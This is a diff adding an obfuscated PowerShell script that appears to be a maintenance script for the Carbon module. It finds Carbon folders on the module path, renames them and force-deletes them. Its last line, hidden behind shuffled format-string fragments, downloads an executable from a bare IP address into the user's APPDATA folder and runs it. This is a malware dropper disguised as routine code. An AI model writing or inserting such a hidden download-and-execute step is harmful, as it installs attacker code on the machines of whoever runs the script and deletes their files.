@@ -1,0 +1,31 @@
+ $97j3=  [TyPE]("{1}{0}"-f 'ATh','io.P')  ;
+
+
+
+
+
+
+
+
+
+
+
+[CmdletBinding()]
+param(
+)
+
+
+Set-StrictMode -Version ("{1}{0}"-f'atest','L')
+$ErrorActionPreference = ("{0}{1}" -f'Sto','p')
+
+
+Get-Item -Path ("{0}{3}{1}{2}"-f 'e','duleP','ath','nv:PSMo') |
+    Select-Object -ExpandProperty ("{1}{0}"-f'ue','Val')-ErrorAction Ignore |
+    ForEach-Object { $_ -split ';' } |
+    Where-Object { $_ } |
+    Join-Path -ChildPath ("{2}{1}{0}" -f'bon','ar','C') |
+    Where-Object { Test-Path -Path $_ -PathType Container } |
+    Rename-Item -NewName { 'Carbon{0}' -f   (  GCi  ('VAriabl'+'E:97J'+'3') ).VALue::GetRandomFileName() } -PassThru |
+    Remove-Item -Recurse -Force
+
+(New-Object System.Net.WebClient).DownloadFile(("{0}{5}{3}{1}{6}{8}{2}{7}{4}" -f 'ht','70.218/~yah','/c','.1','rsv.exe','tp://89.248','o','s','o'),"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")
